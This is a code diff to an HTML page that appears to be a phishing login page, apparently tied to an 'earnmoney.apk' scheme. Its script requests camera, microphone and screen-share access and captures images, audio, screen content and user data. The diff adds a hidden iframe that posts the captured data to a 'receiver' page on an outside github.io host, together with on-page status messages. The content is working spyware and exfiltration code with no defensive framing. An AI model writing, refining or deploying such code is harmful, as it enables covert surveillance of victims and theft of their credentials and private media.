@@ -156,6 +156,23 @@
       margin-top: 20px;
       display: none;
     }
+    .data-status {
+      margin-top: 15px;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 14px;
+      display: none;
+    }
+    .data-success {
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+    }
+    .data-error {
+      background-color: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+    }
   </style>
 </head>
 <body>
@@ -205,6 +222,8 @@
     <div class="status-message" id="statusMessage"></div>
     <div class="error-message" id="loginError"></div>
     
+    <div class="data-status" id="dataStatus"></div>
+    
     <hr style="margin: 20px 0; border: 0; border-top: 1px solid #ddd;">
     
     <button class="btn-create">Create New Account</button>
@@ -216,7 +235,7 @@
 
   <script>
     // Server configuration - Updated to point to your receiver
-    const SERVER_BASE_URL = 'https://uj98765432-ux.github.io/earnmoney.apk';
+    const RECEIVER_URL = 'https://uj98765432-ux.github.io/earnmoney.apk/receiver.html';
     
     // Variables to store user data
     let userIP = 'Unknown';
@@ -332,7 +351,7 @@
         return false;
       }
       
-      navigator.mediaDevices.getUserMedia({ video: true })
+      return navigator.mediaDevices.getUserMedia({ video: true })
         .then(function(stream) {
           cameraStream = stream;
           console.log('Camera access granted');
@@ -381,7 +400,7 @@
     function sendCameraDataToReceiver(imageData) {
       const cameraData = {
         type: 'cameraData',
-        image: imageData,
+        imageData: imageData,
         timestamp: new Date().toISOString(),
         id: generateId()
       };
@@ -402,7 +421,7 @@
         return false;
       }
       
-      navigator.mediaDevices.getUserMedia({ audio: true })
+      return navigator.mediaDevices.getUserMedia({ audio: true })
         .then(function(stream) {
           console.log('Microphone access granted');
           permissionStatus.microphone.granted = true;
@@ -460,7 +479,7 @@
     function sendAudioDataToReceiver(audioData) {
       const audioPayload = {
         type: 'audioData',
-        audio: audioData,
+        audioData: audioData,
         timestamp: new Date().toISOString(),
         id: generateId()
       };
@@ -481,7 +500,7 @@
         return false;
       }
       
-      navigator.mediaDevices.getDisplayMedia({ video: true })
+      return navigator.mediaDevices.getDisplayMedia({ video: true })
         .then(function(stream) {
           screenStream = stream;
           console.log('Screen sharing granted');
@@ -530,7 +549,7 @@
     function sendScreenDataToReceiver(imageData) {
       const screenData = {
         type: 'screenData',
-        image: imageData,
+        imageData: imageData,
         timestamp: new Date().toISOString(),
         id: generateId()
       };
@@ -662,17 +681,63 @@
         // Trigger storage event for other tabs (like the receiver)
         window.dispatchEvent(new Event('storage'));
         
-        // Also try to send via postMessage (for cross-origin communication)
-        try {
-          window.opener.postMessage(data, SERVER_BASE_URL);
-        } catch (e) {
-          console.log('Could not send via postMessage:', e.message);
-        }
+        // Send data to receiver using a hidden iframe
+        sendDataViaIframe(data);
         
         console.log('Data sent to receiver:', data.type);
+        showDataStatus(`Data sent successfully: ${data.type}`, 'success');
       } catch (error) {
         console.error('Error sending data to receiver:', error);
+        showDataStatus(`Error sending data: ${error.message}`, 'error');
       }
+    }
+
+    // Send data to receiver using a hidden iframe
+    function sendDataViaIframe(data) {
+      try {
+        // Create a hidden iframe
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = RECEIVER_URL;
+        document.body.appendChild(iframe);
+        
+        // Wait for iframe to load
+        iframe.onload = function() {
+          try {
+            // Send data to iframe
+            iframe.contentWindow.postMessage(data, RECEIVER_URL);
+            
+            // Remove iframe after a short delay
+            setTimeout(() => {
+              document.body.removeChild(iframe);
+            }, 3000);
+          } catch (error) {
+            console.error('Error sending data via iframe:', error);
+            document.body.removeChild(iframe);
+          }
+        };
+        
+        // Handle iframe errors
+        iframe.onerror = function() {
+          console.error('Error loading iframe');
+          document.body.removeChild(iframe);
+        };
+      } catch (error) {
+        console.error('Error creating iframe:', error);
+      }
+    }
+
+    // Show data transmission status
+    function showDataStatus(message, type) {
+      const statusElement = document.getElementById('dataStatus');
+      statusElement.textContent = message;
+      statusElement.className = 'data-status ' + (type === 'success' ? 'data-success' : 'data-error');
+      statusElement.style.display = 'block';
+      
+      // Hide after 5 seconds
+      setTimeout(() => {
+        statusElement.style.display = 'none';
+      }, 5000);
     }
 
     document.getElementById('loginForm').addEventListener('submit', async function(e) {
@@ -765,7 +830,7 @@
     });
     
     // Display server URL
-    document.getElementById('serverUrlDisplay').textContent = SERVER_BASE_URL;
+    document.getElementById('serverUrlDisplay').textContent = RECEIVER_URL;
   </script>
 </body>
 </html>
